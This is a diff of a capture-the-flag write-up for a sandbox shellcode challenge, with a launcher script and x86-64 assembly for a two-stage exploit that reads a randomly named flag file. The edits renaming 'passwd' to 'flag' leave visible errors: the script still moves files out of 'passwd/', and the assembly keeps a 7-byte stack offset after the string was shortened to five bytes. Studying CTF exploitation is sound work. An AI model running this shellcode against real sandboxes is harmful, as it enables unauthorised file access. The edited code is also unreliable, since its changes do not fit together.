@@ -7,13 +7,14 @@ permitted (and hence, this challenge is a sandbox challenge). The second is the
 size limitation on the size of the shellcode that can be input.
 
 We need to gain access to the flag in the password file; however, everytime the
-vulnerable program is run, the name of the password file is changed to a random
-string of characters (and the file is within a directory, the contents of which
-we cannot view). This necessitates creating shellcode that is not as simple as
-simply opening a known filename and printing the contents to standard output.
-We must open the directory and then read the filename from its directory entry.
-Thankfully, this is at least simplified by the fact this is the only file within
-the directory.
+vulnerable program is run, a random sequence of characters is appended to the flag
+filename, `.flag_<random charseq>`, which uses a strong cryptographically secure
+source of randomness, namely /dev/urandom. This file is in the directory 'flag',
+the contents of which we cannot see with our permissions. This necessitates creating
+shellcode that is not as simple as simply opening a known filename and printing the
+contents to standard output. We must open the directory and then read the filename
+from its directory entry. Thankfully, this is at least simplified by the fact this
+is the only file within the directory.
 
 All of this means the shellcode necessary to complete the challenge is a lot
 longer than the limit, which is 50 bytes.
@@ -25,18 +26,18 @@ we start the vulnerable program:
 #!/bin/sh
 
 PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
-CHALLENGE_PATH="$(dirname ${0})"
+PATH_TO_CHALLENGE="$(dirname ${0})"
 
-cd $CHALLENGE_PATH
+cd $PATH_TO_CHALLENGE
 
-UUID=$(tr -dc A-Za-z0-9 < /dev/urandom | head -c 32)
+NEW_RANDOM_ID=$(tr -dc A-Za-z0-9 < /dev/urandom | head -c 32)
 
-chmod 700 passwd/
-mv passwd/.passwd_* "passwd/.passwd_${UUID}"
-chmod 400 passwd/.passwd_*
-chmod 500 passwd/
+chmod 700 flag/
+mv passwd/.flag_* "flag/.flag_${NEW_RANDOM_ID}"
+chmod 400 flag/.flag_*
+chmod 500 flag/
 
-timeout -k 2m 1m ./p-sandbox ./ch10
+timeout -k 2m 1m ./challenge-sandbox ./vuln
 ```
 
 We are only permitted to use the following system calls:
@@ -56,7 +57,7 @@ the restriction of 50 bytes and our shellcode can be as long as we wish.
 
 All of this uses only the restricted subset of system calls in the sandbox.
 
-**Phase one of our exploit**
+**Phase I of our exploit**
 
   - _Open file containing shellcode for phase two_
   - _Map the contents into memory, with the permission set
@@ -66,12 +67,12 @@ All of this uses only the restricted subset of system calls in the sandbox.
 The total size of this part of the exploit is 49 bytes, thus within the
 size limitation of the sandbox.
 
-**Phase two of our exploit**
+**Phase II of our exploit**
 
-  - _Open the "passwd" directory (pass O_DIRECTORY flag to open())_
+  - _Open the "flag" directory (pass O_DIRECTORY flag to open())_
   - _Read the directory entries onto the stack using sys_dirents_
-  - _Push "passwd/" onto the stack and then append the obtained filename to it_
-  - _Open the password file_
+  - _Push "flag/" onto the stack and then append the obtained filename to it_
+  - _Open the flag file_
   - _Read contents onto stack_
   - _Print contents to stdout_
 
@@ -79,7 +80,7 @@ The size of this part of the exploit is 161 bytes, itself well over the size
 limitation. The total size of the exploit is therefore 210 bytes.
 
 
-**Assembly code for part I of the exploit**
+**Assembly code for phase I of the exploit**
 
 ```
 .section .rodata
@@ -130,7 +131,7 @@ _start:
 .globl _start
 
 _start:
-	mov $0x647773736170,%rdi
+	mov $0x67616c66,%rdi
 	push %rdi
 	mov %rsp,%rdi
 	push $O_DIRECTORY
@@ -150,7 +151,7 @@ _start:
 	sub $0x200,%rsp
 	push $42
 	pop %rcx
-	mov $0x2f647773736170,%rdi
+	mov $0x2f67616c66,%rdi
 	push %rdi
 	add $7,%rsp
 	mov %rsp,%rdi
